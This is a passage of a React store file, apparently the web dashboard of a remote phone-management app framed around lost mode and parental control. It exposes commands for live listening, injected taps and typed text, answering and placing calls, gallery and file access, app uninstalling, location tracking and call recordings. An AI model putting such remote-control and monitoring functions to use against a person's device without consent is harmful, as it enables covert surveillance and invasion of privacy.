      stopLiveListen: () => sendCommand('live-listen-stop', { deviceId: activeDeviceId }),
      // Virtual Navigation & Gestures
      sendInputKey: (action) => sendCommand('input-key', { deviceId: activeDeviceId, action }),
      sendInputTap: (x, y, duration = 50) => {
        if (typeof x === 'object' && x !== null) {
          return sendCommand('input-tap', { deviceId: activeDeviceId, ...x });
        }
        return sendCommand('input-tap', { deviceId: activeDeviceId, x, y, duration });
      },
      sendInputSwipe: (x1, y1, x2, y2, duration = 300) => {
        if (typeof x1 === 'object' && x1 !== null) {
          return sendCommand('input-swipe', { deviceId: activeDeviceId, ...x1 });
        }
        return sendCommand('input-swipe', { deviceId: activeDeviceId, x1, y1, x2, y2, duration });
      },
      // Remote Keyboard Typing Injection
      sendInputText: (text) => sendCommand('input-text', { deviceId: activeDeviceId, text }),
      // Remote Screen Wake
      wakeScreen: () => sendCommand('screen-wake', { deviceId: activeDeviceId }),
      // Call Actions (Answer / Decline)
      answerCall: (speaker = true) => sendCommand('call-action', { deviceId: activeDeviceId, action: 'answer', speaker }),
      declineCall: () => sendCommand('call-action', { deviceId: activeDeviceId, action: 'decline' }),
      // Cellular & Dual-SIM Telemetry
      cellularInfo: activeDeviceId ? cellularInfo[activeDeviceId] : null,
      fetchCellularInfo: () => sendCommand('cellular-info', { deviceId: activeDeviceId }),
      // Torch SOS Strobe
      strobeActive,
      toggleTorchStrobe: (enabled, speedMs = 150, durationSec = 30) => sendCommand('torch-strobe', { deviceId: activeDeviceId, enabled, speedMs, durationSec }),
      // Storage & Junk Cleaner
      junkScanData: activeDeviceId ? junkScanData[activeDeviceId] : null,
      isScanningJunk,
      scanJunk: () => {
        setIsScanningJunk(true);
        sendCommand('junk-scan', { deviceId: activeDeviceId });
      },
      cleanJunk: (categoryId, paths) => sendCommand('junk-clean', { deviceId: activeDeviceId, categoryId, paths }),
      // Do Not Disturb (DND)
      dndStatus: activeDeviceId ? dndStatus[activeDeviceId] : null,
      fetchDndStatus: () => sendCommand('dnd-get', { deviceId: activeDeviceId }),
      setDndMode: (mode) => sendCommand('dnd-set', { deviceId: activeDeviceId, mode }),
      // Volume & Sound Manager
      volumeInfo: activeDeviceId ? volumeInfo[activeDeviceId] : null,
      fetchVolumeInfo: () => sendCommand('volume-get', { deviceId: activeDeviceId }),
      setVolumeLevel: (stream, level) => sendCommand('volume-set', { deviceId: activeDeviceId, stream, level }),
      setRingerProfile: (ringerMode) => sendCommand('volume-set', { deviceId: activeDeviceId, ringerMode }),
      // Reverse Clipboard Sync
      writeClipboardText: (text) => sendCommand('clipboard-write', { deviceId: activeDeviceId, text }),
      // Remote URL Opener
      openRemoteUrl: (url) => sendCommand('open-url', { deviceId: activeDeviceId, url }),
      // Battery Health & Telemetry
      batteryStats: activeDeviceId ? batteryStats[activeDeviceId] : null,
      fetchBatteryStats: () => sendCommand('battery-stats', { deviceId: activeDeviceId }),
      // Remote App Launcher
      launchRemoteApp: (packageName) => sendCommand('launch-app', { deviceId: activeDeviceId, packageName }),
      // Lost Mode Screen Emergency Banner
      lostMode: activeDeviceId ? (lostModeState[activeDeviceId] || { active: false }) : { active: false },
      setLostMode: (enable, message, phone, soundAlarm) => sendCommand('lost-mode', { deviceId: activeDeviceId, enable, message, phone, soundAlarm }),
      // Media / Photo Gallery
      galleryPhotos: activeDeviceId ? (galleryPhotos[activeDeviceId] || []) : [],
      galleryLoading,
      fetchGallery: (limit = 36) => {
        setGalleryLoading(true);
        sendCommand('media-gallery', { deviceId: activeDeviceId, limit });
      },
      // File Manager Extended Operations
      deleteFile: (path) => sendCommand('file-delete', { deviceId: activeDeviceId, path }),
      renameFile: (path, newName) => sendCommand('file-rename', { deviceId: activeDeviceId, path, newName }),
      createFolder: (parentPath, folderName) => sendCommand('file-mkdir', { deviceId: activeDeviceId, parentPath, folderName }),
      moveFile: (sourcePath, destParentPath) => sendCommand('file-move', { deviceId: activeDeviceId, sourcePath, destParentPath }),
      copyFile: (sourcePath, destParentPath) => sendCommand('file-copy', { deviceId: activeDeviceId, sourcePath, destParentPath }),
      // Remote App Uninstaller
      uninstallApp: (packageName) => sendCommand('uninstall-app', { deviceId: activeDeviceId, packageName }),
      // Remote Outgoing Phone Call
      makeCall: (number) => sendCommand('call-outgoing', { deviceId: activeDeviceId, number }),
      // Location Trip & Timeline Remote Config
      setTimelineTracking: (enabled, minRadiusMeters = 200, dwellMinutes = 5) =>
        sendCommand('timeline-config', { deviceId: activeDeviceId, enabled, minRadiusMeters, dwellMinutes }),
      // Theft Motion Alarm ("Don't Touch My Phone")
      motionAlarm: activeDeviceId ? (motionAlarmState[activeDeviceId] || { armed: false, triggered: false }) : { armed: false, triggered: false },
      setMotionAlarm: (arm, threshold = 2.5, delaySec = 3) =>
        sendCommand('motion-alarm-config', { deviceId: activeDeviceId, arm, threshold, delaySec }),
      // Live Voice Walkie-Talkie (Intercom)
      walkieTalkieActive,
      startWalkieTalkie: () => sendCommand('walkie-talkie-start', { deviceId: activeDeviceId }),
      sendWalkieTalkieChunk: (data) => sendCommand('walkie-talkie-chunk', { deviceId: activeDeviceId, data }),
      stopWalkieTalkie: () => sendCommand('walkie-talkie-stop', { deviceId: activeDeviceId }),
      clearLocationHistory: async () => {
        try {
          const res = await fetch(`/api/devices/${activeDeviceId}/location/history`, { method: 'DELETE' });
          const out = await res.json();
          if (out && out.success) {
            pushToast('Trip history cleared', 'info');
          }
        } catch (_) {}
      },
      // Navigation & Vault shortcuts
      currentTab,
      setCurrentTab,
      callLogsSubTab,
      setCallLogsSubTab,
      openCallRecordingsVault: () => {
        setCurrentTab('calls');
        setCallLogsSubTab('recordings');
      },
      // Remote Feature Sync Pause & Low-Data Saver
      syncConfig: activeDeviceId ? (deviceSyncConfig[activeDeviceId] || {
        notifications: true,
        calls: true,
        sms: true,
        location: true,
        clipboard: true,
        recordings: true,
        telemetry: true,
        lowDataMode: false
      }) : {
        notifications: true,
        calls: true,
        sms: true,
        location: true,
        clipboard: true,
        recordings: true,
        telemetry: true,
        lowDataMode: false
      },
      updateSyncConfig: (fields) => {
        if (!activeDeviceId) return;
        const current = deviceSyncConfig[activeDeviceId] || {
          notifications: true,
          calls: true,
          sms: true,
          location: true,
          clipboard: true,
          recordings: true,
          telemetry: true,
          lowDataMode: false
        };
        const updated = { ...current, ...fields, deviceId: activeDeviceId };
        setDeviceSyncConfig((prev) => ({ ...prev, [activeDeviceId]: updated }));
        sendCommand('sync-config', updated);
        pushToast('Sync preferences updated', 'info');
      },
      toggleMasterDataSaver: (enable) => {
        if (!activeDeviceId) return;
        const current = deviceSyncConfig[activeDeviceId] || {};
        const updated = { ...current, lowDataMode: enable, deviceId: activeDeviceId };
        setDeviceSyncConfig((prev) => ({ ...prev, [activeDeviceId]: updated }));
        sendCommand('sync-config', updated);
        pushToast(
          enable
            ? '⚡ Ultra Low-Data / Standby Mode ACTIVE (All sync paused)'
            : 'Full Live Sync Resumed',
          enable ? 'warning' : 'success'
        );
      },
      parentalControl: parentalControlState[activeDeviceId] || null,
      appUsage: appUsageData[activeDeviceId] || null,
      updateParentalControl: (config) => {
        if (!activeDeviceId) return;
        sendCommand('parental-control', { ...config, deviceId: activeDeviceId });
      },
      requestAppUsage: () => {
        if (!activeDeviceId) return;
        sendCommand('app-usage', { deviceId: activeDeviceId });
      },
      removeDevice: async (deviceId) => {
        try {
          const res = await fetch(`/api/devices/${deviceId}`, { method: 'DELETE' });
          const out = await res.json();
          if (out && out.success) {
            setDevices((d) => {
              const next = { ...d };
              delete next[deviceId];
              return next;
            });
            setActiveDeviceId((id) => (id === deviceId ? null : id));
            pushToast('Device removed', 'success');
            return true;
          }
          pushToast(`Remove failed: ${out.error || 'unknown error'}`, 'error');
        } catch (e) {
          pushToast(`Remove failed: ${String(e)}`, 'error');
        }
        return false;
      }
    }),
    [devices, activeDeviceId, currentTab, callLogsSubTab, deviceSyncConfig, parentalControlState, appUsageData, calls, messages, locations, contacts, files, notifications, connected, incomingCallAlert, smsAlert, toasts, sendCommand, dismissAlert, dismissSmsAlert, pushToast, deviceInfo, installedApps, wifiInfo, clipboardHistory, clipboardCapture, appPermissions, callBlocklist, micRecording, latestMicAudio, cameraCapturing, latestCameraPhoto, screenshotCapturing, latestScreenshot, screenRecording, latestScreenFrame, cameraStreaming, latestCameraFrame, torchOn, liveListening, latestAudioChunk, volumeInfo, batteryStats, lostModeState, galleryPhotos, galleryLoading, cellularInfo, dndStatus, strobeActive, junkScanData, isScanningJunk, motionAlarmState, walkieTalkieActive]
  );

  return <StoreContext.Provider value={value}>{children}</StoreContext.Provider>;
}

export function useStore() {
  const ctx = useContext(StoreContext);
  if (!ctx) throw new Error('useStore must be used within StoreProvider');
  return ctx;
}